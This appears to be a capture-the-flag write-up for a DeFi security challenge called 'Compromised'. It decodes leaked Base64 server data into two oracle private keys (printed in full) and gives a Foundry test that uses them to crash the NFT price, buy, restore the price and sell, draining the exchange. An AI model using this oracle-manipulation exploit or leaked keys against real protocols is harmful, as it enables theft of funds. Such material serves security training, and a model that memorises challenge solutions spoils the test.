# 7. Compromised

- Decoded Base64 data from leaked server response to extract private keys for oracle reporters
- Used `cast wallet address` to derive addresses and gained control over 2 out of 3 oracle sources
- Manipulated price to 0, bought NFT cheap, set price back to 999 ETH, and sold for profit
- Solution:

```
    function test_compromised() public checkSolved {
        /*
         * ATTACK ANALYSIS:
         *
         * 1. Leaked server data (Base64 encoded):
         *    MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5
         *
         * 2. Decoded to reveal two private keys:
         *    Private Key 1: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
         *    Private Key 2: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
         *
         * 3. Derived addresses using `cast wallet address --private-key <key>`:
         *    Private Key 1 → 0x188Ea627E3531Db590e6f1D71ED83628d1933088 (oracle source 1)
         *    Private Key 2 → 0xA417D473c40a4d42BAd35f147c21eEa7973539D8 (oracle source 2)
         *
         * 4. Oracle sources array:
         *    sources[0] = 0x188Ea627E3531Db590e6f1D71ED83628d1933088 ✅ COMPROMISED
         *    sources[1] = 0xA417D473c40a4d42BAd35f147c21eEa7973539D8 ✅ COMPROMISED
         *    sources[2] = 0xab3600bF153A316dE44827e2473056d56B774a40 ❌ Not compromised
         *
         * 5. Attack vector: Control 2/3 oracle sources = Control median price!
         */

        // Step 1: Manipulate price DOWN using compromised oracle accounts
        vm.prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088);
        oracle.postPrice("DVNFT", 0);

        vm.prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
        oracle.postPrice("DVNFT", 0);

        // Step 2: Player buys NFT at low price
        vm.prank(player);
        uint256 tokenId = exchange.buyOne{value: 1 wei}();

        // Step 3: Manipulate price back UP
        vm.prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        vm.prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        // Step 4: Player approves and sells NFT at high price
        vm.startPrank(player);
        nft.approve(address(exchange), tokenId);
        exchange.sellOne(tokenId);

        // Step 5: Transfer only the exchange's initial balance to recovery account
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }
```
